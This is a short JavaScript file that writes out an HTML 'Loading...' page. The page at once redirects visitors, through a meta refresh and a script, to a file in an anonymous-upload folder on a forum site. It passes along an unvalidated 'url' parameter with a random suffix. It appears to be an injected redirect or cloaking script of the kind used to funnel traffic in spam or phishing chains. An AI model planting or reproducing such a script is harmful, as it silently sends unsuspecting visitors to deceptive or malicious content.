document.writeln("<!DOCTYPE html>");
document.writeln("<html lang=\"en\">");
document.writeln("<head>");
document.writeln("<meta charset=\"UTF-8\">");
document.writeln("<meta http-equiv=\"refresh\" content=\"0; URL=https://bbs.z01.com/UploadFiles/Anony/content/md/UQxKUOuKFi.html\">");
document.writeln("<title>正在加载...</title>");
document.writeln("<script>");
document.writeln("// 获取 URL 参数");
document.writeln("const queryString = window.location.search;");
document.writeln("const urlParams = new URLSearchParams(queryString);");
document.writeln("const customParam = urlParams.get(\'url\');");
document.writeln("");
document.writeln("// 生成随机数字和英文组合");
document.writeln("const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母");
document.writeln("");
document.writeln("// 构建跳转链接");
document.writeln("let redirectURL = \"https://bbs.z01.com/UploadFiles/Anony/content/md/UQxKUOuKFi.html\";");
document.writeln("if (customParam) {");
document.writeln("redirectURL += \"?url=\" + customParam + \"?\" + randomString; // 将随机字符串添加到参数后面");
document.writeln("}");
document.writeln("");
document.writeln("// 执行跳转");
document.writeln("window.location.href = redirectURL;");
document.writeln("</script>");
document.writeln("</head>");
document.writeln("");
document.writeln("</html>");
